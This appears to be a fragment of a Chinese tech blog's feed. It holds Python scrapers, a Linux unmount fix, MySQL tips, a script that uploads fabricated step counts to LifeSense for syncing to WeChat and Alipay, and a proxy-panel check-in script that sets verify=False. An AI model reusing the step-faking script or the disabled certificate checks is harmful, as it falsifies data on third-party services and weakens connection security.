class="hljs-keyword">import</span> re<br><span class="hljs-keyword">import</span> json<br><span class="hljs-keyword">from</span> multiprocessing <span class="hljs-keyword">import</span> Pool<br><br><br><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">get_one_page</span>(<span class="hljs-params">url</span>):</span><br>    <span class="hljs-keyword">try</span>:<br>        <span class="hljs-comment"># 没有UA网页会乱码</span><br>        headers = &#123;<br>            <span class="hljs-string">&#x27;user-agent&#x27;</span>: <span class="hljs-string">&#x27;Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/80.0.3239.132 Safari/537.36&#x27;</span><br>        &#125;<br>        response = requests.get(url, headers=headers)<br>        <span class="hljs-keyword">if</span> response.status_code == <span class="hljs-number">200</span>:<br>            <span class="hljs-keyword">return</span> response.text<br>        <span class="hljs-keyword">return</span> <span class="hljs-literal">None</span><br>    <span class="hljs-keyword">except</span> RequestException <span class="hljs-keyword">as</span> e:<br>        print(e)<br>        <span class="hljs-keyword">return</span> <span class="hljs-literal">None</span><br><br><br><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">parse_one_page</span>(<span class="hljs-params">html</span>):</span><br>    pattern = re.<span class="hljs-built_in">compile</span>(<span class="hljs-string">&#x27;&lt;dd&gt;.*?board-index.*?&gt;(\d+)&lt;/i&gt;.*?data-src=&quot;(.*?)&quot;.*?name&quot;&gt;&lt;a.*?&quot;&gt;(.*?)&lt;/a&gt;.*?star&quot;&gt;(.*?)&lt;/p&gt;.*?releasetime&quot;&gt;(.*?)&lt;/p&gt;.*?integer&quot;&gt;(.*?)&lt;/i&gt;.*?fraction&quot;&gt;(.*?)&lt;/i&gt;.*?&lt;/dd&gt;&#x27;</span>, re.S)<br>    items = re.findall(pattern, html)<br>    <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> items:<br><span class="hljs-comment"># yield 是一个生成器</span><br>        <span class="hljs-keyword">yield</span> &#123;<br>            <span class="hljs-string">&#x27;index&#x27;</span>: i[<span class="hljs-number">0</span>],<br>            <span class="hljs-string">&#x27;image&#x27;</span>: i[<span class="hljs-number">1</span>],<br>            <span class="hljs-string">&#x27;title&#x27;</span>: i[<span class="hljs-number">2</span>],<br><span class="hljs-comment"># str.strip()就是把这个字符串头和尾的空格，以及位于头尾的\n \t之类给删掉</span><br>            <span class="hljs-string">&#x27;actor&#x27;</span>: i[<span class="hljs-number">3</span>].strip()[<span class="hljs-number">3</span>:],<br>            <span class="hljs-string">&#x27;time&#x27;</span>: i[<span class="hljs-number">4</span>].strip()[<span class="hljs-number">5</span>:],<br>            <span class="hljs-string">&#x27;score&#x27;</span>: i[<span class="hljs-number">5</span>]+i[<span class="hljs-number">6</span>]<br>        &#125;<br><br><br><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">write_to_file</span>(<span class="hljs-params">content</span>):</span><br>    <span class="hljs-comment"># # 编码输出</span><br>    <span class="hljs-comment"># with open(&#x27;result.txt&#x27;, &#x27;a&#x27;) as f:</span><br>    <span class="hljs-comment">#     f.write(json.dumps(content) + &quot;\n&quot;)</span><br>    <span class="hljs-comment">#     f.close()</span><br>    <span class="hljs-comment"># 中文输出</span><br>    <span class="hljs-keyword">with</span> <span class="hljs-built_in">open</span>(<span class="hljs-string">&#x27;result.txt&#x27;</span>, <span class="hljs-string">&#x27;a&#x27;</span>, encoding=<span class="hljs-string">&#x27;utf-8&#x27;</span>) <span class="hljs-keyword">as</span> f:<br>        f.write(json.dumps(content, ensure_ascii=<span class="hljs-literal">False</span>) + <span class="hljs-string">&#x27;\n&#x27;</span>)<br>        f.close()<br><br><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">main</span>(<span class="hljs-params">offset</span>):</span><br>    url = <span class="hljs-string">&#x27;https://maoyan.com/board/4?offset=&#x27;</span> + <span class="hljs-built_in">str</span>(offset)<br>    html = get_one_page(url)<br>    <span class="hljs-keyword">for</span> item <span class="hljs-keyword">in</span> parse_one_page(html):<br>        print(item)<br>        write_to_file(item)<br><br><br><span class="hljs-keyword">if</span> __name__ == <span class="hljs-string">&#x27;__main__&#x27;</span>:<br>    <span class="hljs-comment"># for i in range(10):</span><br>    <span class="hljs-comment">#     main(i*10)</span><br><br>    <span class="hljs-comment"># 多进程</span><br>    pool = Pool()<br>    pool.<span class="hljs-built_in">map</span>(main, [i*<span class="hljs-number">10</span> <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">10</span>)])<br><br></code></pre></td></tr></table></figure>]]></content>
    
    
    
    <tags>
      
      <tag>python</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>Linux系统下无法卸载挂载的解决办法</title>
    <link href="/2021/01/57.html"/>
    <url>/2021/01/57.html</url>
    
    <content type="html"><![CDATA[<blockquote><p>在日常运维中经常性会遇到需要进行磁盘的扩容、卸载、挂载等操作，但是有时候这个系统上跑的应用并没有停止或者有其他的运维同事在操作这个目录，这个时候我们是无法直接umount卸载掉的，所以今天就给大家分享一下如果遇到这种问题了，我们如何去合理的处理?</p></blockquote><p>现象描述：这里我们需要将/www目录卸载掉，如下图所示：<br><img src="https://p.pstatp.com/origin/1374b00025551ee96e710" srcset="/img/loading.gif" lazyload></p><p>执行卸载命令：<code>umount /www</code>后，发现卸载不了，提示资源被占用，如下图所示：<br><img src="https://p.pstatp.com/origin/fffe0001d1f8cfadace4" srcset="/img/loading.gif" lazyload></p><p>上面我们已经看到了，提示被占用，无法卸载，如何处理呢?方法很简单，可以使用<code>umount -f /www</code>强制卸载<br><img src="https://p.pstatp.com/origin/ff8300037e48197ecdba" srcset="/img/loading.gif" lazyload></p><p><code>-f</code> 参数为强制进行卸载，上面使用的强制卸载并未生效，还是报错了，现在使用fuser命令查看有哪些进程在占用目录<br><img src="https://p.pstatp.com/origin/1382e00024a057add1370" srcset="/img/loading.gif" lazyload></p><p>查看到有很多进程目前在占用此目录，所以无法卸载，现在有两种方法结束这些进程。</p><ul><li>第一种：平时常用到的<code>kill -9 进程号</code></li><li>第二种：结束目录中的所有进程<code>fuser -m -v -i -k /www</code><br><img src="https://p.pstatp.com/origin/137d10003575939ab06cc" srcset="/img/loading.gif" lazyload></li></ul><p><code>umount /www</code>   再次卸载，已经没有报错了</p><p><code>df -h</code>  查看这个设备已经卸载掉<br><img src="https://p.pstatp.com/origin/138b50000c908da17f452" srcset="/img/loading.gif" lazyload></p><p><strong>原文来自尊云<a href="https://www.zun.com/news/content/98.html">https://www.zun.com/news/content/98.html</a></strong></p>]]></content>
    
    
    
    <tags>
      
      <tag>Linux</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>宝塔mysql总是自动停止解决方法总汇</title>
    <link href="/2021/01/56.html"/>
    <url>/2021/01/56.html</url>
    
    <content type="html"><![CDATA[<blockquote><p>宝塔的数据库经常性自动停止，是因为网站频繁的请求数据库，而服务器内存又不足，为了保证服务器不彻底卡死，保护性的自动停止数据库，特别是有些程序比如ZBlog的数据库查询次数尤为突出，加上ZBlog插件之多，就算你不进行任何操作，你的后台也是在频繁的请求数据库！</p></blockquote><blockquote><p>就更不要提通过一些插件备份网站，做大量的文章更新，以及采集等，如果服务器配置很低，甚至采集一篇文章十几张图片就能瞬间让你的内存跑满导致服务器彻底卡死！当然导致这种问题除了服务器配置不够还跟你设置不当所导致有关，比如MySQL、php等性能设置！当然今天讨论的主题并不是这。</p></blockquote><blockquote><p>虽然ZBlog可以通过缓存减轻数据库负担，但是当你管理后台更新文章或其他操作还是会不可避免的请求数据库，特别是ZBlog这种越来越臃肿的程序，且避免不了一些人恶意的请求以及垃圾蜘蛛的恶意爬取，导致数据库保护性暂停。</p></blockquote><p>当然这里是推荐你更换更高配置的服务器，如果你不打算更换可以考虑一下方法解决宝塔面板数据库自动停止的问题！</p><p>出现数据库经常停止可以参照下面解决方案：</p><h1 id="方法一："><a href="#方法一：" class="headerlink" title="方法一："></a>方法一：</h1><ul><li>安装宝塔面板【linux工具箱】<br><img src="https://ae01.alicdn.com/kf/U482efb232e4b4a9fa0cecd78abc6d46ej.jpg" srcset="/img/loading.gif" lazyload></li><li>添加设置SWAP大小，根据你的实际内存进行调整，swap是Linux下的虚拟内存，设置适当的swap可增加服务器稳定性，<br>建议swap容量在真实内存容量的1.5倍左右，若您的服务器内存大于4GB，可设1-2GB的固定值，swap文件默认保存在/www/swap，设置前请确保磁盘空间够用。<br><img src="https://ae01.alicdn.com/kf/Ue2f6f44cd8c9478b862832d0056daf98T.jpg" srcset="/img/loading.gif" lazyload></li></ul><h1 id="方法二："><a href="#方法二：" class="headerlink" title="方法二："></a>方法二：</h1><ul><li>根据你的实际内存进行mysql优化<br><img src="https://ae01.alicdn.com/kf/Uc4456d93ef6f449992e8f1e09294c555s.jpg" srcset="/img/loading.gif" lazyload></li></ul><p>#方法三：<br>这个方法简单粗暴，适合土豪站长，直接增加服务器内存或使用云数据库，把数据库分离出去。</p><p>导致数据库自动暂停是多方面的，这篇文的方法并没有从根本上解决这个问题，而是尽量减少数据库导致网站长时间无法正常，如果你的数据库一个星期只是3-4次自定停止，通过这个可以有效解决，对seo优化和用户体验也不会有太大影响！</p><p>如果经常性的一天数据库就停止好几次，那么就是宝塔设置有问题了，请检查你的宝塔设置是否有安全问题，以及数据库配置和php版本设置是否得当，经常看看日志是否有恶意请求！</p><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs awk">本文原地址：https:<span class="hljs-regexp">//</span>www.wenytao.com<span class="hljs-regexp">/blog/</span><span class="hljs-number">333</span>.html<span class="hljs-comment">#comments</span><br></code></pre></td></tr></table></figure>]]></content>
    
    
    
    <tags>
      
      <tag>web</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>【PYTHON】乐心健康刷微信支付宝步数</title>
    <link href="/2020/10/55.html"/>
    <url>/2020/10/55.html</url>
    
    <content type="html"><![CDATA[<h1 id="lx-step"><a href="#lx-step" class="headerlink" title="lx-step"></a>lx-step</h1><p>【Python】腾讯云云函数配合乐心健康刷QQ、微信、支付宝步数(支持随机步数、微信QQ推送)</p><h1 id="方法"><a href="#方法" class="headerlink" title="方法"></a>方法</h1><ol><li>下载乐心健康APP：官方下载地址：<a href="http://www.lifesense.com/app/">http://www.lifesense.com/app/</a></li><li>从应用商店下载乐心健康App，打开软件并选择手机号登录</li><li>登录之后，点击我的-&gt;设置-&gt;账号与安全-&gt;设置密码(修改密码)，设置你自己记得住的密码</li><li>回到App首页，点击我的-&gt;数据共享，绑定你想同步数据的项目注：同步微信运动请按照要求关注【乐心运动】公众号。</li><li>回到云函数代码，配置好下图参数，运行即可提交步数即可同步至你绑定的所有平台<br><img src="https://attach.52pojie.cn/forum/202009/26/220610s1ehd59u55uh5uce.png" srcset="/img/loading.gif" lazyload alt="1"></li><li>设置好云函数触发规则</li></ol><h1 id="其他"><a href="#其他" class="headerlink" title="其他"></a>其他</h1><p><a href="https://www.52pojie.cn/thread-1274977-1-1.html">https://www.52pojie.cn/thread-1274977-1-1.html</a></p><h1 id="代码"><a href="#代码" class="headerlink" title="代码"></a>代码</h1><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-comment"># -*- coding: utf8 -*-</span><br><span class="hljs-keyword">import</span> requests<br><span class="hljs-keyword">import</span> hashlib<br><span class="hljs-keyword">import</span> json<br><span class="hljs-keyword">import</span> time<br><span class="hljs-keyword">import</span> random<br><br><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">md5</span>(<span class="hljs-params">code</span>):</span><br>    res=hashlib.md5()<br>    res.update(code.encode(<span class="hljs-string">&quot;utf8&quot;</span>))<br>    <span class="hljs-keyword">return</span> res.hexdigest()<br><br><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">get_information</span>(<span class="hljs-params">mobile,password</span>):</span><br>    header = &#123;<br>        <span class="hljs-string">&#x27;Content-Type&#x27;</span>: <span class="hljs-string">&#x27;application/json; charset=utf-8&#x27;</span>,<br>        <span class="hljs-string">&quot;User-Agent&quot;</span>: <span class="hljs-string">&quot;Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/85.0.4183.121 Safari/537.36&quot;</span><br>    &#125;<br>    url=<span class="hljs-string">&quot;http://sports.lifesense.com/sessions_service/login?systemType=2&amp;version=4.6.7&quot;</span><br>    datas = &#123;<br>        <span class="hljs-string">&quot;appType&quot;</span>:<span class="hljs-number">6</span>,<br>        <span class="hljs-string">&quot;clientId&quot;</span>:md5(<span class="hljs-string">&quot;5454&quot;</span>),<br>        <span class="hljs-string">&quot;loginName&quot;</span>:<span class="hljs-built_in">str</span>(mobile),<br>        <span class="hljs-string">&quot;password&quot;</span>:md5(<span class="hljs-built_in">str</span>(password)),<br>        <span class="hljs-string">&quot;roleType&quot;</span>:<span class="hljs-number">0</span><br>        &#125;<br>    response =requests.post(url,headers=header,data=json.dumps(datas))<br>    <span class="hljs-keyword">return</span> response.text<br><br><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">update_step</span>(<span class="hljs-params">step,information</span>):</span><br>    step =<span class="hljs-built_in">int</span>(step)<br>    url=<span class="hljs-string">&quot;http://sports.lifesense.com/sport_service/sport/sport/uploadMobileStepV2?version=4.5&amp;systemType=2&quot;</span><br>    accessToken=json.loads(information)[<span class="hljs-string">&quot;data&quot;</span>][<span class="hljs-string">&quot;accessToken&quot;</span>]<br>    userId=json.loads(information)[<span class="hljs-string">&quot;data&quot;</span>][<span class="hljs-string">&quot;userId&quot;</span>]<br>    <span class="hljs-comment">#print(accessToken)</span><br>    <span class="hljs-comment">#print(userId)</span><br>    <span class="hljs-comment">#获取当前时间和日期</span><br>    timeStamp=time.time()<br>    localTime = time.localtime(timeStamp)<br>    strTime = time.strftime(<span class="hljs-string">&quot;%Y-%m-%d %H:%M:%S&quot;</span>, localTime)<br>    print(strTime)<br>    measureTime=strTime+<span class="hljs-string">&quot;,&quot;</span>+<span class="hljs-built_in">str</span>(<span class="hljs-built_in">int</span>(timeStamp))<br><br>    header = &#123;<br>    <span class="hljs-string">&#x27;Cookie&#x27;</span>: <span class="hljs-string">&#x27;accessToken=&#x27;</span>+accessToken,<br>    <span class="hljs-string">&#x27;Content-Type&#x27;</span>: <span class="hljs-string">&#x27;application/json; charset=utf-8&#x27;</span>,<br>    <span class="hljs-string">&quot;User-Agent&quot;</span>: <span class="hljs-string">&quot;Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/85.0.4183.121 Safari/537.36&quot;</span><br>    &#125;<br>    sport_datas = &#123;<br>        <span class="hljs-string">&quot;list&quot;</span>: [<br>            &#123;<br>                <span class="hljs-string">&quot;DataSource&quot;</span>:<span class="hljs-number">2</span>,<br>                <span class="hljs-string">&quot;active&quot;</span>:<span class="hljs-number">1</span>,<br>                <span class="hljs-string">&quot;calories&quot;</span>:<span class="hljs-built_in">str</span>(<span class="hljs-built_in">int</span>(step/<span class="hljs-number">4</span>)),<br>                <span class="hljs-string">&quot;dataSource&quot;</span>:<span class="hljs-number">2</span>,<br>                <span class="hljs-string">&quot;deviceId&quot;</span>:<span class="hljs-string">&quot;M_NULL&quot;</span>,<br>                <span class="hljs-string">&quot;distance&quot;</span>:<span class="hljs-built_in">str</span>(<span class="hljs-built_in">int</span>(step/<span class="hljs-number">3</span>)),<br>                <span class="hljs-string">&quot;exerciseTime&quot;</span>:<span class="hljs-number">0</span>,<br>                <span class="hljs-string">&quot;isUpload&quot;</span>:<span class="hljs-number">0</span>,<br>                <span class="hljs-string">&quot;measurementTime&quot;</span>:measureTime,<br>                <span class="hljs-string">&quot;priority&quot;</span>:<span class="hljs-number">0</span>,<br>                <span class="hljs-string">&quot;step&quot;</span>: <span class="hljs-built_in">str</span>(step),<br>                <span class="hljs-string">&quot;type&quot;</span>:<span class="hljs-number">2</span>,<br>                <span class="hljs-string">&quot;updated&quot;</span>:<span class="hljs-built_in">str</span>(<span class="hljs-built_in">int</span>(time.time()*<span class="hljs-number">1000</span>)),<br>                <span class="hljs-string">&quot;userId&quot;</span>:<span class="hljs-built_in">str</span>(userId)<br>                &#125;]<br>                &#125;<br>    result=requests.post(url,headers=header,data=json.dumps(sport_datas))<br>    <span class="hljs-keyword">return</span> result.text<br><br><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">server_send</span>(<span class="hljs-params">msg</span>):</span><br>    <span class="hljs-keyword">if</span> sckey == <span class="hljs-string">&#x27;&#x27;</span>:<br>        <span class="hljs-keyword">return</span><br>    server_url = <span class="hljs-string">&quot;https://sc.ftqq.com/&quot;</span> + <span class="hljs-built_in">str</span>(sckey) + <span class="hljs-string">&quot;.send&quot;</span><br>    data = &#123;<br>            <span class="hljs-string">&#x27;text&#x27;</span>: msg,<br>            <span class="hljs-string">&#x27;desp&#x27;</span>: msg<br>        &#125;<br>    requests.post(server_url, data=data)<br><br><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">kt_send</span>(<span class="hljs-params">msg</span>):</span><br>    <span class="hljs-keyword">if</span> ktkey == <span class="hljs-string">&#x27;&#x27;</span>:<br>        <span class="hljs-keyword">return</span><br>    kt_url = <span class="hljs-string">&#x27;https://push.xuthus.cc/send/&#x27;</span>+<span class="hljs-built_in">str</span>(ktkey)<br>    data = (<span class="hljs-string">&#x27;步数刷取完成，请查看详细信息~\n&#x27;</span>+<span class="hljs-built_in">str</span>(msg)).encode(<span class="hljs-string">&quot;utf-8&quot;</span>)<br>    requests.post(kt_url, data=data)<br><br><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">execute_walk</span>(<span class="hljs-params">phone,password,step</span>):</span><br>    information=get_information(phone,password)<br>    update_result=update_step(step,information)<br>    result=json.loads(update_result)[<span class="hljs-string">&quot;msg&quot;</span>]<br>    <span class="hljs-keyword">if</span> result == <span class="hljs-string">&#x27;成功&#x27;</span>:<br>        msg = <span class="hljs-string">&quot;刷新步数成功！此次刷取&quot;</span> + <span class="hljs-built_in">str</span>(step) + <span class="hljs-string">&quot;步。&quot;</span><br>        print(msg)<br>        server_send(msg)<br>        kt_send(msg)<br>    <span class="hljs-keyword">else</span>:<br>        msg = <span class="hljs-string">&quot;刷新步数失败！请查看云函数日志。&quot;</span><br>        print(msg)<br>        server_send(msg)<br>        kt_send(msg)<br>    <br><br><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">main</span>():</span><br>    <span class="hljs-keyword">if</span> phone <span class="hljs-keyword">and</span> password <span class="hljs-keyword">and</span> step != <span class="hljs-string">&#x27;&#x27;</span>:<br>        execute_walk(phone, password, step)<br>    <span class="hljs-keyword">else</span>:<br>        print(<span class="hljs-string">&quot;参数不全,请指定参数。或者在调用中直接指定参数&quot;</span>)<br><br><span class="hljs-comment"># -- 配置 --</span><br><span class="hljs-comment"># ------------------------------</span><br>phone = <span class="hljs-string">&#x27;&#x27;</span>  <span class="hljs-comment"># 登陆账号</span><br>password = <span class="hljs-string">&#x27;&#x27;</span>  <span class="hljs-comment"># 密码</span><br>step = random.randint(<span class="hljs-number">30000</span>,<span class="hljs-number">40000</span>)  <span class="hljs-comment"># 随机30000-40000步数</span><br>sckey = <span class="hljs-string">&#x27;&#x27;</span>  <span class="hljs-comment"># server酱key(可空)</span><br>ktkey = <span class="hljs-string">&#x27;&#x27;</span>  <span class="hljs-comment"># 酷推key(可空)</span><br><span class="hljs-comment"># ------------------------------</span><br><br><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">main_handler</span>(<span class="hljs-params">event, context</span>):</span><br>    <span class="hljs-keyword">return</span> main()<br><br><span class="hljs-keyword">if</span> __name__ == <span class="hljs-string">&#x27;__main__&#x27;</span>:<br>    main()<br></code></pre></td></tr></table></figure>]]></content>
    
    
    
    <tags>
      
      <tag>python</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>利用腾讯云函数实现机场每日自动签到领流量</title>
    <link href="/2020/09/54.html"/>
    <url>/2020/09/54.html</url>
    
    <content type="html"><![CDATA[<h1 id="说明"><a href="#说明" class="headerlink" title="说明"></a>说明</h1><ul><li>云函数部署地址<a href="https://cloud.tencent.com/product/scf">https://cloud.tencent.com/product/scf</a> ,部署方法自行百度</li><li>适用SSPanel面板</li><li>项目地址<a href="https://github.com/ne-21/sspanel-automaticcheckin">https://github.com/ne-21/sspanel-automaticcheckin</a> ,最新脚本请到此获取</li></ul><h1 id="功能"><a href="#功能" class="headerlink" title="功能"></a>功能</h1><ul><li>自动签到</li><li>Server酱微信推送</li></ul><h1 id="感谢"><a href="#感谢" class="headerlink" title="感谢"></a>感谢</h1><ul><li>基于项目<a href="https://github.com/zhjc1124/ssr_autocheckin">https://github.com/zhjc1124/ssr_autocheckin</a> 修改</li></ul><h1 id="代码"><a href="#代码" class="headerlink" title="代码"></a>代码</h1><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-comment"># -*- coding: utf-8 -*-</span><br><span class="hljs-string">&quot;&quot;&quot;</span><br><span class="hljs-string">@Time ： 2020/9/15 9:52</span><br><span class="hljs-string">@Auth ： Ne-21</span><br><span class="hljs-string">@Des : sspanel自动每日签到脚本</span><br><span class="hljs-string">@File ：sspanel_qd.py</span><br><span class="hljs-string">@IDE ：PyCharm</span><br><span class="hljs-string">@Motto：Another me.</span><br><span class="hljs-string">sspanel自动每日签到脚本，基于项目https://github.com/zhjc1124/ssr_autocheckin修改</span><br><span class="hljs-string">&quot;&quot;&quot;</span><br><span class="hljs-keyword">import</span> requests<br><span class="hljs-keyword">import</span> re<br><br>requests.packages.urllib3.disable_warnings()<br><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">SspanelQd</span>(<span class="hljs-params"><span class="hljs-built_in">object</span></span>):</span><br>    <span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">__init__</span>(<span class="hljs-params">self</span>):</span><br>        <span class="hljs-comment"># 机场地址</span><br>        self.base_url = <span class="hljs-string">&#x27;https://****.net&#x27;</span><br>        <span class="hljs-comment"># 登录信息</span><br>        self.email = <span class="hljs-string">&#x27;****@qq.com&#x27;</span><br>        self.password = <span class="hljs-string">&#x27;****&#x27;</span><br>        <span class="hljs-comment"># Server酱推送</span><br>        self.sckey = <span class="hljs-string">&#x27;SCU109245Tf34928bcea84db0a*************&#x27;</span><br><br>    <span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">checkin</span>(<span class="hljs-params">self</span>):</span><br>        email = self.email.split(<span class="hljs-string">&#x27;@&#x27;</span>)<br>        email = email[<span class="hljs-number">0</span>] + <span class="hljs-string">&#x27;%40&#x27;</span> + email[<span class="hljs-number">1</span>]<br>        password = self.password<br><br>        session = requests.session()<br><br>        session.get(self.base_url, verify=<span class="hljs-literal">False</span>)<br><br>        login_url = self.base_url + <span class="hljs-string">&#x27;/auth/login&#x27;</span><br>        headers = &#123;<br>            <span class="hljs-string">&#x27;User-Agent&#x27;</span>: <span class="hljs-string">&#x27;Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/56.0.2924.87 Safari/537.36&#x27;</span>,<br>            <span class="hljs-string">&#x27;Content-Type&#x27;</span>: <span class="hljs-string">&#x27;application/x-www-form-urlencoded; charset=UTF-8&#x27;</span>,<br>        &#125;<br><br>        post_data = <span class="hljs-string">&#x27;email=&#x27;</span> + email + <span class="hljs-string">&#x27;&amp;passwd=&#x27;</span> + password + <span class="hljs-string">&#x27;&amp;code=&#x27;</span><br>        post_data = post_data.encode()<br>        response = session.post(login_url, post_data, headers=headers, verify=<span class="hljs-literal">False</span>)<br><br>        headers = &#123;<br>            <span class="hljs-string">&#x27;User-Agent&#x27;</span>: <span class="hljs-string">&#x27;Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/56.0.2924.87 Safari/537.36&#x27;</span>,<br>            <span class="hljs-string">&#x27;Referer&#x27;</span>: self.base_url + <span class="hljs-string">&#x27;/user&#x27;</span><br>        &#125;<br><br>        response = session.post(self.base_url + <span class="hljs-string">&#x27;/user/checkin&#x27;</span>, headers=headers, verify=<span class="hljs-literal">False</span>)<br>        msg1 = (response.json()).get(<span class="hljs-string">&#x27;msg&#x27;</span>)<br><br>        info_url = self.base_url + <span class="hljs-string">&#x27;/user&#x27;</span><br>        response = session.get(info_url, verify=<span class="hljs-literal">False</span>)<br>        level = re.findall(<span class="hljs-string">r&#x27;\[&quot;Class&quot;, &quot;(.*?)&quot;],&#x27;</span>, response.text)[<span class="hljs-number">0</span>]<br>        day = re.findall(<span class="hljs-string">r&#x27;\[&quot;Class_Expire&quot;, &quot;(.*)&quot;],&#x27;</span>, response.text)[<span class="hljs-number">0</span>]<br>        rest = re.findall(<span class="hljs-string">r&#x27;\[&quot;Unused_Traffic&quot;, &quot;(.*?)&quot;]&#x27;</span>, response.text)[<span 